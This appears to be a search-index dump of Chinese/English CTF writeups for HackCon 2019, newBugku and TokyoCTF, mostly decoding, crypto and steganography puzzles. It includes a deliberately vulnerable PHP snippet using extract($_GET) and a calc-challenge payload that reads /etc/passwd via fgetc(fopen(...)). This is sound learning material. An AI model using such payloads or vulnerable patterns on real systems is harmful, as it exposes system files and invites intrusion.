93a6 \\n 596d 6272 a34b 9cf8 224e 9c38 71e2 1f45 \\n 9cf8 edd5 2626 1327 4efc ab34 714d b871 \\n 5e2f ddbf cbfb f33f 19e2 d311 9f8e f874 \\n c4a7 233e 1df1 e988 4f47 7c3a e22f 7dfa \\n f5df d79a 3d79 ebb3 f7e6 337a 463c 9bb7 \\n 928e 24e2 9788 67f3 56d2 9144 fc12 f16c \\n de4a 3a92 885f 229e cd5b 4947 12f1 4bc4 \\n b379 2ba9 7e16 b479 aab6 b973 b9d9 a1a9 \\n b627 4e9c 3871 e2c4 89bf 8d38 71e2 c489 \\n ff36 f17d 67c7 cd0e 48fb 9eaf 7d54 3ecd \\n 4b9c 7877 ccc4 8913 27de 1e33 71e2 c489 \\n b7c7 4c9c f89f f6ed 1887 4118 88a2 e095 \\n 9cfb 5f2e 0d12 4189 94c2 cf80 c4fc 1ab3 \\n ec6c 055a ee21 ded4 6da6 507f 0318 5b88 \\n 139f af4b 9c38 71e2 6d5d e2c4 8913 6feb \\n 1227 7e37 f146 add9 93ae dfcf 7f84 38f1 \\n e98e 8813 3f84 38f1 e98e 8813 3f84 38f1 \\n e98e 8813 ffc8 d2bb 34cf 5c4f b599 dbeb \\n d46d e62d 0bce 1227 4e9c 787b 9638 71e2 \\n c4db b3c4 8913 7f92 f8bf 5cf3 87ea bacd \\n e5e6 baf1 15e2 c489 1721 be87 3871 e245 \\n 88ef 214e 9c78 11e2 63bc 0150 4b01 023f \\n 0314 0300 0008 00d0 05d1 4e20 5740 de75 \\n 0500 00c4 1602 0008 0000 0000 0000 0000 \\n 0020 80b4 8100 0000 0064 6174 612e 7478 \\n 7450 4b05 0600 0000 0001 0001 0036 0000 \\n 009b 0500 0000 00\" b = a . split ( ' \\n ' ) for i in range ( len ( b )): n = b [ i ] . encode ( 'utf-8' ) f . write ( n ) f . close () \u4f46\u662f\u8fd9\u6bb5\u811a\u672c\u6ca1\u6709\u6210\u529f\u3002\u3002 When I see the first line of that hex text that I found, I realize that it is a zip file (based on the header). I copy that hex and save it as a zip file . I unzip it and I got a file called data.txt which contains binary file. When I convert it into an ASCII String, it turns into gibberish text. After spending a long time trying to figure out that binary, turns out it is a QR Code. After I convert it into a QR Code, the decoded QR is the flag.","title":"GIMP IT"},{"location":"writeup/hackcon2019/#web","text":"Given a web http://68.183.158.95/secret_agent/ that show a string Should d4rkc0de make their own browser . It is a classic challenge, we just need to change the user-agent to that string.","title":"web"},{"location":"writeup/hackcon2019/#jorge-luis-borges","text":"\u663e\u7136\u90a3\u4e2a\u662fBrainFuck \u5f97\u5230 First, we decode the description with Brainfuck deobfuscator, we have a equation: x 4-314x 3+2771x^2-7954x+7320=0 Solve it!!! x=2, x=3, x=4, x=305 \u7b2c\u4e00\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u5b50\u7684\uff1a 1 33 68 64 68 6a 32 69 6e 6f 35 ..... \u663e\u7136\u662fASCII\u7801\uff0c\u8f6c\u4e00\u4e0b\u5f97\u5230 1 3hdhj2ino5cs711ip1jl8kl816gz0it3fzz6hzuo4lkk0as7xitwr3he6oopwsv7voci3i4tepb22sqltf0ed7814zahhag1cit4kd8zxfnyrz2okh07l4z6k87941pcjnemlnyq3rfp1qfbam6mi6h7a9x3b1m24to0jv66cuayb7jx0nvfwkhhwyz7m6fv99rplkile9ngdr0hv49xb74clrheoqowkd8a9sbgl5ia4k3bucrxax1ydxu6louv42iphyd01znbz004sgw8rgqu148se864xvwk9z2smvikys308v242njv8yg52o96sig0hf34q33dd157x5veulwbyvqrzf1hbywk8itwx14j0bdksigmx18ngi79gdgk1t65lqpyk9ngz3zxn6pa5j0ys7144cfqkew98s9nprasm3xfi6nkpliinklxgtgkj0ym1ecw0rfiph62futxqmfb9qseqpasg2bel91efisdtjftsrlutdtb9hkzx81lxa92s9g8fysczabqy3oal9iwq3c2761m1rwp41msqfk8tis1rhgwa31z6fe3yj4gmvsxlw1wrhyb1f7g5cf02syf8ji721d1pcu9yux8sdk3zukhobvs3axkuc9qfvgu34eq2wn5xbt6eha05tugff5v0aingolwz7170vxhvtscqbt5nu1pl8j18dtk77rlvpbsmoxi0v0ah1o1b8afamhs82n4x2vbdsoxmm36ps1cf34dqljgfsga2fozoefde36mtuvg9urd5fohu97hu1gu8xllcxta5zcqmkbz3ovpuv5f8oe2c09sfhk0w1yvlxdnh7ywra9lon125q7f5v9fyppfnun9j0zgtj7i9cmt5ykgsdbr9hil9f5b2ettg29quvb02da3xl5tvie5ky9kwb1bxu4bxku5j82j9upyenach78zq0b8htp3wmdf87yo6wmm1tpfoxbu4oa3js8mjnvu209rf0o64wek2135pvbobu378bjz0w3rq9umxfxtj2v69tjwkdux0n2wpzkgopzmgcdvvb6wv4y8g6f0u12xbwcepot5lm55sm2o5c5r5gb329xvauknvkq0udkvou9lv75jurxa64k208u93e68fk8n3q6qs66fofowfwqjidn11v3febxqu77jnj4923rnnkrvutcr625l8e5z330marrt5benok542p19qob6cxzasy8m3q4sx4wszzun956ucfwm1qqo62660dgqmo8t7y2gj3ylkgap7gr3gfwtkkeqhwenqrywpg8it6clj744c3lylkzqh89h55105izp3jz6jr2ft5e6d7abinisdedkt6i6fh77s57w96hgb86rbv43u4w8tymm29syjlem27c7hf4yabouq68s4zzb9hm9cla5i0ymf8rz3fctei4bofdolbriyhl9adl9eva393d7kla5blzqr7hmz3p1p80a9akvvduumov70xchc0jbctwq52ju8t6ieeuseqdroi3zkjw7pj6ivtjr2cei262gldr4abor694m5iubmhueyg2pxrjuj1h9tqfytc1uzk23aru3bmpgblo4l4l4kf5ivwcp67nhy9mgeisu571fult6wkuvlbywuzaheuxml7m4u1yjqw6g0u6xld1yzg5qisf7j5bz569kajvh6stlqmcs0la1wnri9sg9m3diu7br88wlsb6dg17z9zuw63ej54c24sxnduhirh7p4ltromy26ra3edsiiwj4gkkxa5zxrv7bploeskujv549q6g69eo8f0guopfr9h98xkeeoeow69x8gokutl8m0swoa2u4oq9a0okmtpl0c6j3rumsqyv7lr8dw1wf85th7uz8vjy1ovitw9woshu4tdhaa4ur3dpa79r7qttq2000z2rmacgj63bw5gdgnjj9tb3b7z72zu0hvbr61z0tw3upk7sn162r0wmqnifxr2tr7fd0mhyp79xvu64amxwvqes6e5wwa4phj1myw4yfcn7vfos13z3urmsyncggtkubs8ifriqb7frm6wajwu9wizpkfdrn6hob92322t63fi7on7xenllys6n76tx4e7mw880an07ij95g3ghyd8dbebcrfdkl1tb58owhta5qhzwekxqmn3tok8sv83kumztyamkeph0lw0cvvs6yamxynngy4vr3j7582m614tep2lfahgoubzzos3rloyedlbfy00x0n38jziysdkdgji1uxzyhnst931dqgz7w6d9g1wyia0rki1zzit58soj5vbx5xrbwwvw0ek0c6y8gujx3xvajjqcsl5t7sesjfb0tr8p7flp8fzpokzl42s0b86gh6ggnsymguzeeivwzhjz096wj3p8kl46izj35d2w4hlbx5fkleltl2ghdttx4698blgd4wbux04svz1e9649dzhja2s01kyl5opmy1wxsiypv1lc64s6oeee6e41s1enbijtbj19funhpmsmzsqpzpkqplimuycuhsz6ljdvhk3e3o6ml7ezckw2x4ry4pyxqw4lji1agq0wj7n7a1xwz78erzz831jciq866su6puq5h9omsf7oa8l18ix7l4lw6iry2o612lkgd83meqlun3rd6wej821e8noktby8nhoy6e97jkcv52haiahe4tpdzh0pprnjwm203yumiadjzwvvrkqyxdzyx9pnook6s9xwf0fjiwxsjff6w0fgpdhv5glqd2ienn1h475i45df8j8wja8jpotloji3mdwdt8m8qmtyjxzrcmcxkvw2negz1hda7j2xb6u3vhhnq2xt89clygemmj1eosg6n6px360hngiq94sk6xqz1hr02lpombgrh84be0w5zr3sgv4n6wo7d59tddl6ycwk19c7r5ebqc71z1p00odk34dsyah3bb96npl05d6yhdicz8yv4eaauu1j4h57ia8yvm5r1drxz5zfbpx81zys2l9babdz4w6mopvthslhffjxjhj7wor7dyxxstn62gb4rellqyv3890c7uutqhj9yuwgxr6l9mcvqe2wd74fue5pp0e5dnzo0s70lknmuy0qmpg1o1rus1kybfu5vcwax7omsm6xk621ddwfn9tatwbc1slsgh7139ufgnjwdbx9acqewaf2lkdglakng82etn9xfupzvo9fvvibt28m8am0iiwdoyvs2fkypcdose7a3gs2kwkd4ua1wjf \u7136\u540e\u770b\u7b2c\u4e8c\u4e2a\u6587\u4ef6 1 2 3 4 5 6 x = 0, y = 0, rule = B3/S23 3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob3ob 3ob3ob3ob3ob3ob3ob3ob3ob3o$obobobobobobobobobobobobobobobobobobobobobo bobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobo bobobobobob3o$obobobobobobobobobobobobobobobobobobobobobobobobobobobob obobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobobob3o x = 0, y =0, rule = B3/S23 ? We Google it and found some interesting results : RLE file format , Conway's Game of Life . Okay, we tried with all part with \"!\" present. With a final part, import to this , we get a result \u53c8\u662f\u4e00\u79cd\u795e\u5947\u7684\u7f16\u7801 Run Length Encoded Run Length Encoded The first line is a header line, which has the form 1 x = m, y = n x = 0, y =0, rule = B3/S23 ? We Google it and found some interesting results : RLE file format , Conway's Game of Life . Okay, we tried with all part with \"!\" present. With a final part, import to this , we get a result 1 2 3 4 x = 0, y = 0, rule = B3/S23 10$obo5b3obob3obob ob$obob3obo7bobobobobob3o$bo2b3ob3obo2bo2b3ob3o$bo2b3obo3bobo3b3ob3ob3o $bo2bobobo3bob3obobob3o$! \"YmFiZWw= \" (base64) -> babel Okay, Google again. The name of challenge \"Jorge Luis Borges\", \"book\", \"babel\". And then, we get the book with a website https://libraryofbabel.info hex name: strings from file1 wall : 2 shelf : 3 volume: 4 page: 305 \u8fd9\u8111\u6d1e\u6709\u70b9\u5927\u554a\u3002","title":"Jorge Luis Borges"},{"location":"writeup/hackcon2019/#invisible-programming","text":"\u5f97\u5230\u4e00\u4e2aCPP\u6587\u4ef6 1 2 3 4 5 6 7 #include <iostream> using namespace std ; int main () { cout << \"The flag is d4rk{You_thought_this_will_be that_much_easy}c0de \\n \" ; return 0 ; } \u5f88\u5947\u602a\uff0c\u4e8e\u662f\u3002\u3002 After googling a bit, it seems to resemble WhiteSpace esolang. Trying to execute it throws some syntax errors, so I quickly gave up on that. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import re h = open ( 'hello_world.cpp' ) lines = [ x [: - 1 ] for x in h . readlines () ] # remove newline char h . close () flag = [] for line in lines : num = '' . join ( re . findall ( r '\\s+' , line )) . replace ( ' \\t ' , '1' ) . replace ( ' ' , '0' ) if num : try : flag . append ( chr ( int ( num , 2 ))) except : pass print ( '' . join ( flag )) \u76ee\u524d\u5bf9\u4e8epython\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u8fd8\u4e0d\u662f\u5f88\u719f\u6089\u4e3b\u8981\u662f\u90a3\u4e2a join(re.findall(r'\\s+', line)).replace('\\t','1').replace(' ','0') \u6b64\u65f6\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u8fd8\u9700\u8981\u5bf9\u6587\u4ef6\u505a\u4e00\u4e9b\u4fee\u6539 \u4e00\u4e2a\u5e08\u5085\u5199\u7684js\u7248\u672c\uff1a 1 2 3 4 5 6 7 8 9 10 11 function decoder ( str ) { var flag = '' ; str . replace ( /.{7}/g , function ( strByte ) { var binStr = strByte . replace ( / /g , '0' ). replace ( / /g , '1' ); var charCode = parseInt ( binStr , 2 ); result += String . fromCharCode ( charCode ); }); return flag ; }","title":"Invisible Programming"},{"location":"writeup/hackcon2019/#superencryptor-reversing","text":"\u4e0d\u61c2\u56fd\u5916\u7684\u5206\u7c7b\uff1a \u5f97\u5230\u4e00\u4e2aenc\u8fd8\u4ee5\u4e3a\u662f\u6d41\u91cf\u5305\uff0c\u7ed3\u679c\u662f\u4e00\u6bb5\u5b57\u7b26\uff1a 1 d9a68b755a6e7be6aaa912105d749fb8ae33506e4adefeb0745e5c70cfa88c71 \u8fd9\u6837\u7684\u4e00\u4e2a\u7a0b\u5e8f \u8fd8\u662f\u770bwp\u5427 1 2 3 4 5 6 7 8 9 echo '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' | ./q3 _ _ __ __ _ _ __ _____ __ | \\ | | | \\/ (_) | \\ \\ / / _ \\/_ | | \\| | __ _ _ __ ___ | \\ / |_| |_ ___ ___ \\ \\ / / | | || | | . ` |/ _` | '_ \\ / _ \\| |\\/| | | __/ _ \\/ __| \\ \\/ /| | | || | | |\\ | (_| | | | | (_) | | | | | || __/\\__ \\ \\ / | |_| || | |_| \\_|\\__,_|_| |_|\\___/|_| |_|_|\\__\\___||___/ \\/ \\___(_)_| String to encrypt (Max 5000) : Encrypted : abcdef4123310abcdef4123310ab \u7136\u540e\u5c31\u83ab\u540d\u7684\u8ba4\u4e3a\u8fd9\u4e2a\u662f\u4ea6\u6216\u8fd0\u7b97\uff1f\uff1f\u4e0d\u8fc7\u4ed6\u8fd9\u662f\u600e\u4e48\u60f3\u51fa\u6765\u7684\u554a First thought that came to my mind was that it was an XOR operation with the key abcdef4123310 . When I XORed this key with the content of flag.enc, I got: 1 rkd4y_{MgFS3lt4uArs_Ju3_5}mpdec0 which looks like the shuffled version of the flag. Swapped two sides inside each 4-byte block, and got the flag: 1 d4rk{My_S3gF4ults_Ar3_Jump5}c0de \u8fd9\u6837\u5c31\u5f97\u5230flag\u4e86","title":"SuperEncryptor | Reversing"},{"location":"writeup/hackcon2019/#gife_me_time-forensics","text":"\u8fd9\u4e2a\u7c7b\u522b\u7684\u9898\u76ee\u4e5f\u662f\u7b2c\u4e00\u6b21\u89c1 \u8bbf\u95ee\u4e86\u8fd9\u6837\u4e00\u4e2a\u9875\u9762","title":"GIFe_me_time | Forensics"},{"location":"writeup/hackcon2019/#_1","text":"https://medium.com/@Nicholaz99/hackcon2019-writeup-4639553b9355 https://ctftime.org/writeups https://hackcon.online/challenges#GIMP IT Github Invisible Programming","title":"\u53c2\u8003"},{"location":"writeup/new-bugku/","text":"newBugku \u00b6 \u8bb0\u5f55\u4e00\u4e0bnewBugku\u7684\u9898\u89e3 web26 \u00b6 \u5229\u7528 and \u8fd9\u4e2a\u5c0ftrick Web1 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php error_reporting ( 0 ); include 'flag.php' ; $b = 'ssAEDsssss' ; extract ( $_GET ); if ( isset ( $a )){ $c = trim ( file_get_contents ( $b )); if ( $a == $c ){ echo $myFlag ; } else { } } \u53d8\u91cf\u8986\u76d6\u52a0\u4f2a\u534f\u8bae\u7ed5\u8fc7 \u4f46\u662f\u59ff\u52bf\u4e0d\u6b63\u786e\u662f\u51e0\u4e2a\u610f\u601d\uff1f\uff1f\uff1f md5\u662f\u53ef\u4ee5\u6210\u529f\u89e3\u5bc6\u7684\u4f46\u662f\u3002\u8fd8\u662f\u59ff\u52bf\u4e0d\u6b63\u786e \u4e0d\u662f\u5f88\u7406\u89e3\u8fd9\u4e2a\u505a\u6cd5\uff1a \u4e00\u4e2a\u7f51\u7ad9 web9 \u00b6 \u6839\u636e\u9898\u76ee\u63d0\u793a PUT \u8054\u60f3\u5230PUT\u534f\u8bae\uff0c\u5c1d\u8bd5\u4f7f\u7528 curl \u63d0\u4ea4\u5374\u5931\u8d25\u4e86\uff1f\uff1f web6 \u00b6 \u4fee\u6539HTTP\u5934\uff0c\u8fd9\u6b21IP\u6ca1\u6709\u88ab\u7981\u6b62\u4e86 \u67e5\u770b\u6e90\u4ee3\u7801\u624d\u53d1\u73b0\u6709\u4e00\u4e2a\u6ce8\u91ca\uff1a <!-- dGVzdDEyMw== -->% base64\u89e3\u7801\u4e4b\u540e\u662f test123 \u662f\u7528\u6237\u540d\u8fd8\u662f\u5bc6\u7801\u5462\uff1f\u7206\u7834\u8bd5\u4e00\u4e0b \u76f4\u63a5\u7528\u6237\u540d admin \u5bc6\u7801 test123 \u5c1d\u8bd5\u6210\u529f \u4f46\u662f\u63d0\u4ea4\u7684\u65f6\u5019\u59ff\u52bf\u4e0d\u5bf9 \u7136\u800c\u63d0\u4ea4\u8fd8\u662f\u59ff\u52bf\u4e0d\u5bf9 md5\u89e3\u5bc6\u7f51\u7ad9 \u5934\u50cf \u00b6 \u5f97\u5230\u4e00\u5f20\u56fe\u7247 \u56fe\u7247\u4e0a\u7684\u5b57\u662f milk chocolate \u725b\u5976\u5de7\u514b\u529b\uff1f\uff1f binwalk\u5206\u6790\uff1a binwalk \u89c9\u5f97\u91cc\u9762\u6709\u4e00\u4e2a TIFF \u56fe\u50cf \u7136\u800c zsteg \u5de5\u5177\u4e0d\u652f\u6301 \u7a81\u7136\u53d1\u73b0\u4e0b\u8f7d\u7684\u56fe\u7247\u540e\u7f00\u662fpng\u7684\u4f46\u662f\u5b9e\u9645\u4e0a\u786e\u5b9ejpg\u683c\u5f0f\u7684 \u662f\u5426\u6697\u793a\u4e86\u4ec0\u4e48\u5462\uff1f\uff1f dd \u547d\u4ee4\u662f\u8981\u5b66\u4e60\u4e00\u4e0b\u4e86 binwalk \u786e\u5b9e\u6ca1\u9519\u662f\u53ef\u4ee5\u63d0\u53d6\u51fa\u6765\u7684\uff0c\u4e0d\u8fc7\u8981\u81ea\u5df1\u624b\u52a8\u7528 dd \u547d\u4ee4 \u7136\u540e strings \u4e00\u4e0b\u5c31\u884c\u4e86 \u5176\u5b9e\u4e00\u5f00\u59cb\u5c31\u53ef\u4ee5strings\u7684\u3002\u53ea\u662f\u81ea\u5df1\u4e00\u65f6\u6ca1\u6709\u53d1\u73b0 \u7136\u540e\u6211\u4eec\u9700\u8981base64\u89e3\u7801\u518dmd5\u52a0\u5bc6\u5f97\u5230\u6700\u7ec8\u7684flag\u3002\u3002\u3002 \u8bba\u575b\u4e2d\u7684\u4e00\u9053web \u00b6 \u94fe\u63a5 \u767b\u9646\u754c\u9762\uff0c\u5bc6\u7801\u5904\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u65e0\u7f18\u65e0\u6545\u7684\u586b\u5145\u4e86Password \u6362\u4e2a\u6d4f\u89c8\u5668\u4e5f\u662f\u7684 \u6293\u5305\u7684\u65f6\u5019\u53d1\u73b0: \u5728\u63d0\u4ea4\u5b8c\u8868\u5355\u4e4b\u540e\u8fde\u7eed\u53d1\u9001\u4e86\u56db\u4e2a\u8bf7\u6c42\uff0c\u800c\u4e14\u76f8\u5e94\u90fd\u662f404. \u6e90\u4ee3\u7801\u4e2d\u6709\u8fd9\u6837\u7684\uff0c\u6240\u4ee5\u4e0d\u586b\u7684\u65f6\u5019\u9ed8\u8ba4\u662fUsername\u548cPassword \u8fdb\u5236\u8f6c\u6362 \u00b6 \u731c\u5230\u662f4\u8fdb\u5236\uff0c\u8bd5\u4e00\u4e0b\u6210\u529f\u4e86 1 2 3 4 5 6 7 a = '1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331' b = a . split ( ' ' ) res = [] for i in b : res . append ( int ( i , 4 )) for i in res : print ( chr ( i ), end = '' ) web2 \u00b6 \u5199\u811a\u672c 1 2 3 4 5 6 7 8 import requests from bs4 import BeautifulSoup sess = requests . session () res = sess . get ( 'http://123.206.31.85:10002/' ) res_beauty = BeautifulSoup ( res . text ) result = eval ( res_beauty . p . contents [ 2 ][ 1 :]) res1 = sess . post ( 'http://123.206.31.85:10002/' , data = { 'result' : result }) print ( res1 . text ) \u8fd8\u662f\u8981\u5f00\u4e00\u4e2asession\u624d\u5bf9 web11 \u00b6 \u626b\u63cf\u5230\u5982\u4e0b\u6587\u4ef6\u4e4b\u540e\u8bbf\u95eeshell.php md5\u7206\u7834 1 2 3 4 5 6 7 8 9 10 11 12 13 import random import string def md5 ( str ): import hashlib m = hashlib . md5 () m . update ( str ) return m . hexdigest () while 1 : string = '' s = string . join ( random . sample ( 'qwertyuiopasdfghjklzxcvbnm1234567890' , 4 )) if md5 ( s . encode ( 'utf-8' ))[ 0 : 6 ] == '447e2a' : ----> \u6539\u6210\u8981\u7206\u7834\u7684 print ( s ) break \u53c2\u8003 \u00b6","title":"newBugku"},{"location":"writeup/new-bugku/#newbugku","text":"\u8bb0\u5f55\u4e00\u4e0bnewBugku\u7684\u9898\u89e3","title":"newBugku"},{"location":"writeup/new-bugku/#web26","text":"\u5229\u7528 and \u8fd9\u4e2a\u5c0ftrick","title":"web26"},{"location":"writeup/new-bugku/#web1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php error_reporting ( 0 ); include 'flag.php' ; $b = 'ssAEDsssss' ; extract ( $_GET ); if ( isset ( $a )){ $c = trim ( file_get_contents ( $b )); if ( $a == $c ){ echo $myFlag ; } else { } } \u53d8\u91cf\u8986\u76d6\u52a0\u4f2a\u534f\u8bae\u7ed5\u8fc7 \u4f46\u662f\u59ff\u52bf\u4e0d\u6b63\u786e\u662f\u51e0\u4e2a\u610f\u601d\uff1f\uff1f\uff1f md5\u662f\u53ef\u4ee5\u6210\u529f\u89e3\u5bc6\u7684\u4f46\u662f\u3002\u8fd8\u662f\u59ff\u52bf\u4e0d\u6b63\u786e \u4e0d\u662f\u5f88\u7406\u89e3\u8fd9\u4e2a\u505a\u6cd5\uff1a \u4e00\u4e2a\u7f51\u7ad9","title":"Web1"},{"location":"writeup/new-bugku/#web9","text":"\u6839\u636e\u9898\u76ee\u63d0\u793a PUT \u8054\u60f3\u5230PUT\u534f\u8bae\uff0c\u5c1d\u8bd5\u4f7f\u7528 curl \u63d0\u4ea4\u5374\u5931\u8d25\u4e86\uff1f\uff1f","title":"web9"},{"location":"writeup/new-bugku/#web6","text":"\u4fee\u6539HTTP\u5934\uff0c\u8fd9\u6b21IP\u6ca1\u6709\u88ab\u7981\u6b62\u4e86 \u67e5\u770b\u6e90\u4ee3\u7801\u624d\u53d1\u73b0\u6709\u4e00\u4e2a\u6ce8\u91ca\uff1a <!-- dGVzdDEyMw== -->% base64\u89e3\u7801\u4e4b\u540e\u662f test123 \u662f\u7528\u6237\u540d\u8fd8\u662f\u5bc6\u7801\u5462\uff1f\u7206\u7834\u8bd5\u4e00\u4e0b \u76f4\u63a5\u7528\u6237\u540d admin \u5bc6\u7801 test123 \u5c1d\u8bd5\u6210\u529f \u4f46\u662f\u63d0\u4ea4\u7684\u65f6\u5019\u59ff\u52bf\u4e0d\u5bf9 \u7136\u800c\u63d0\u4ea4\u8fd8\u662f\u59ff\u52bf\u4e0d\u5bf9 md5\u89e3\u5bc6\u7f51\u7ad9","title":"web6"},{"location":"writeup/new-bugku/#_1","text":"\u5f97\u5230\u4e00\u5f20\u56fe\u7247 \u56fe\u7247\u4e0a\u7684\u5b57\u662f milk chocolate \u725b\u5976\u5de7\u514b\u529b\uff1f\uff1f binwalk\u5206\u6790\uff1a binwalk \u89c9\u5f97\u91cc\u9762\u6709\u4e00\u4e2a TIFF \u56fe\u50cf \u7136\u800c zsteg \u5de5\u5177\u4e0d\u652f\u6301 \u7a81\u7136\u53d1\u73b0\u4e0b\u8f7d\u7684\u56fe\u7247\u540e\u7f00\u662fpng\u7684\u4f46\u662f\u5b9e\u9645\u4e0a\u786e\u5b9ejpg\u683c\u5f0f\u7684 \u662f\u5426\u6697\u793a\u4e86\u4ec0\u4e48\u5462\uff1f\uff1f dd \u547d\u4ee4\u662f\u8981\u5b66\u4e60\u4e00\u4e0b\u4e86 binwalk \u786e\u5b9e\u6ca1\u9519\u662f\u53ef\u4ee5\u63d0\u53d6\u51fa\u6765\u7684\uff0c\u4e0d\u8fc7\u8981\u81ea\u5df1\u624b\u52a8\u7528 dd \u547d\u4ee4 \u7136\u540e strings \u4e00\u4e0b\u5c31\u884c\u4e86 \u5176\u5b9e\u4e00\u5f00\u59cb\u5c31\u53ef\u4ee5strings\u7684\u3002\u53ea\u662f\u81ea\u5df1\u4e00\u65f6\u6ca1\u6709\u53d1\u73b0 \u7136\u540e\u6211\u4eec\u9700\u8981base64\u89e3\u7801\u518dmd5\u52a0\u5bc6\u5f97\u5230\u6700\u7ec8\u7684flag\u3002\u3002\u3002","title":"\u5934\u50cf"},{"location":"writeup/new-bugku/#web","text":"\u94fe\u63a5 \u767b\u9646\u754c\u9762\uff0c\u5bc6\u7801\u5904\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u65e0\u7f18\u65e0\u6545\u7684\u586b\u5145\u4e86Password \u6362\u4e2a\u6d4f\u89c8\u5668\u4e5f\u662f\u7684 \u6293\u5305\u7684\u65f6\u5019\u53d1\u73b0: \u5728\u63d0\u4ea4\u5b8c\u8868\u5355\u4e4b\u540e\u8fde\u7eed\u53d1\u9001\u4e86\u56db\u4e2a\u8bf7\u6c42\uff0c\u800c\u4e14\u76f8\u5e94\u90fd\u662f404. \u6e90\u4ee3\u7801\u4e2d\u6709\u8fd9\u6837\u7684\uff0c\u6240\u4ee5\u4e0d\u586b\u7684\u65f6\u5019\u9ed8\u8ba4\u662fUsername\u548cPassword","title":"\u8bba\u575b\u4e2d\u7684\u4e00\u9053web"},{"location":"writeup/new-bugku/#_2","text":"\u731c\u5230\u662f4\u8fdb\u5236\uff0c\u8bd5\u4e00\u4e0b\u6210\u529f\u4e86 1 2 3 4 5 6 7 a = '1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331' b = a . split ( ' ' ) res = [] for i in b : res . append ( int ( i , 4 )) for i in res : print ( chr ( i ), end = '' )","title":"\u8fdb\u5236\u8f6c\u6362"},{"location":"writeup/new-bugku/#web2","text":"\u5199\u811a\u672c 1 2 3 4 5 6 7 8 import requests from bs4 import BeautifulSoup sess = requests . session () res = sess . get ( 'http://123.206.31.85:10002/' ) res_beauty = BeautifulSoup ( res . text ) result = eval ( res_beauty . p . contents [ 2 ][ 1 :]) res1 = sess . post ( 'http://123.206.31.85:10002/' , data = { 'result' : result }) print ( res1 . text ) \u8fd8\u662f\u8981\u5f00\u4e00\u4e2asession\u624d\u5bf9","title":"web2"},{"location":"writeup/new-bugku/#web11","text":"\u626b\u63cf\u5230\u5982\u4e0b\u6587\u4ef6\u4e4b\u540e\u8bbf\u95eeshell.php md5\u7206\u7834 1 2 3 4 5 6 7 8 9 10 11 12 13 import random import string def md5 ( str ): import hashlib m = hashlib . md5 () m . update ( str ) return m . hexdigest () while 1 : string = '' s = string . join ( random . sample ( 'qwertyuiopasdfghjklzxcvbnm1234567890' , 4 )) if md5 ( s . encode ( 'utf-8' ))[ 0 : 6 ] == '447e2a' : ----> \u6539\u6210\u8981\u7206\u7834\u7684 print ( s ) break","title":"web11"},{"location":"writeup/new-bugku/#_3","text":"","title":"\u53c2\u8003"},{"location":"writeup/tokyoctf2019/","text":"TokyoCTF \u00b6 calc \u00b6 \u8f93\u5165 fgetc(fopen(\"/etc/passwd\", \"r\")) \u8fd9\u6837\u53ef\u4ee5\u8bfb\uff1f \u771f\u7684\u80fd\u76f4\u63a5\u8bfb\u3002\u3002 \u60ca\u4e86\u3002\u6ca1\u6743\u9650 real-baby-rsa \u00b6 \u8bf4\u8d77\u6765\u867d\u7136\u662f\u4e00\u9053\u5f88\u7b80\u5355\u7684\u9898\u76ee\u4f46\u662f\u6211\u8fd8\u662f\u5b66\u4e60\u5230\u4e86\u5f88\u591a \u9996\u5148\u8bd5RSA\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u6700\u8fd1web\u9898\u76ee\u9047\u5230\u4e86\u5f88\u591a\u7684\u5bc6\u7801\u5b66\u7684\u9898\u76ee\uff0c\u6240\u4ee5web\u72d7\u4e5f\u5f00\u59cb\u505a\u8d77\u4e86\u5bc6\u7801\u5b66 \u8bf4\u8d77\u6765\u4e5f\u633a\u7b80\u5355\u7684\u5c31\u662f\u53bb\u7a77\u4e3e\u6240\u6709\u7684\u53ef\u80fd\u56e0\u4e3a\u8fd9\u4e2a\u9898\u76ee\u4e0d\u77e5\u9053\u79c1\u94a5\uff0c\u8bdd\u8bf4\u79c1\u94a5\u7b97\u4e0d\u51fa\u6765\u5417\uff1f 1 2 3 4 5 6 7 8 9 import string d = {} # \u751f\u6210\u4e00\u4e2a\u5b57\u5178\u5b58\u7740\u6240\u6709\u7684\u53ef\u89c1\u5b57\u7b26\u548c\u5bf9\u5e94\u7684\u52a0\u5bc6\u540e\u7684\u503c n = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091 e = 65537 for i in string . printable : d [ pow ( ord ( i ), e , n )] = i print '' . join ([ d [ int ( i )] for i in open ( 'output' ) . read () . split ( ' \\n ' )[: - 1 ]]) \u53c2\u8003 \u00b6","title":"TokyoCTF"},{"location":"writeup/tokyoctf2019/#tokyoctf","text":"","title":"TokyoCTF"},{"location":"writeup/tokyoctf2019/#calc","text":"\u8f93\u5165 fgetc(fopen(\"/etc/passwd\", \"r\")) \u8fd9\u6837\u53ef\u4ee5\u8bfb\uff1f \u771f\u7684\u80fd\u76f4\u63a5\u8bfb\u3002\u3002 